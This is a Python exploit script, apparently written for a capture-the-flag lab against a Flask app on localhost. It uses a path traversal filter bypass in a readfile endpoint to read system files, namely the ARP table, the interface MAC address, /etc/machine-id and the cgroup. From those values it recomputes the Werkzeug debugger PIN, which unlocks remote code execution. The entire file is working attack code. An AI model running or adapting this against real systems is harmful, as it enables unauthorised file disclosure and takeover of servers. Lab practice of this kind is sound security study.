import requests 
import time
import re
import hashlib
from itertools import chain


payload1 = 'etc/machine-id'
payload2 = 'proc/net/arp'
payload3 = 'sys/class/net/'
url = 'http://localhost:7777/readfile?file=....//...//...//...//...//' #change your ip to challenge lab ip
payload4 = 'proc/self/cgroup'

def get_mac_adderess():
    r = requests.get(url+payload2)
    #print(r.text)
    pattern = r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\s+\S+\s+\S+\s+\S+\s+\S+\s+(\S+)'
    devices = re.findall(pattern,r.text)
   # print(f'Devices = '+ str(devices))
    payload3 = f'sys/class/net/{devices[0]}/address'
    r = requests.get(url+payload3)
    mac = r.text
    payload = re.sub(":","", mac)
    hex_macaddress = int("0x" + payload,16)
    #print(hex_macaddress)
    return hex_macaddress
    

def get_machine_id():
    r = requests.get(url + payload1)
    machine_id = r.text.rstrip('\n')
    # print("Actual:",machine_id)
    r = requests.get(url + payload4)
    x = r.text
    extracted_string = x.split(":")[-1]
    cgroup = extracted_string.split("/")[-1].rstrip('\n')
    appended = machine_id + cgroup
    # Remove spaces from the appended value
    appended = appended.replace(" ", "")
    return appended


mac_address = str(get_mac_adderess())
appended =get_machine_id()

#print(type(mac_address))  

print("MAC Address:", mac_address)
print("Appended Value:", appended.replace(" ", ""))


probably_public_bits = [
    'Alex',  # username
    'flask.app',  # modname
    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.10/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]


private_bits = [
    mac_address,  # str(uuid.getnode()),  /sys/class/net/ens33/address
    appended  # get_machine_id(), /etc/machine-id
]


# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
